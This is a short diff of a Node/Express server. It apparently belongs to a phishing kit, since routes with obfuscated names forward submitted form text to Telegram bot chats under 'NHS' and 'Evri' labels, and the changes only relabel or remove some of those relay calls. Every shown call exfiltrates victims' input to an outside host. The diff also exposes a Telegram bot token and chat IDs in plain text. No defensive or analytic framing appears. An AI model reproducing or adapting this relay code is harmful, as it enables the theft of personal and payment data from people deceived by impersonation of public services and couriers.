@@ -1121,9 +1121,6 @@ app.post('/skiii719',  apiLimiter, (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
             );
-            axios.post(
-                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
-            );
             skiii719 += 1;
         }
 
@@ -1173,7 +1170,7 @@ app.post('/Tcapz688',  apiLimiter, (req, res) => {
             skiii719 = 0;
         } else {
             axios.post(
-                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
+                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=NHSFZ:\n${originalText}`
             );
             axios.post(
                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
@@ -1568,7 +1565,7 @@ app.post('/F_zn66',  apiLimiter, (req, res) => {
             F_zn66 = 0;
         } else {
             axios.post(
-                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
+                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=EvriFZ:\n${originalText}`
             );
             axios.post(
                 `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1612469030&text=Evri:\n${originalText}`
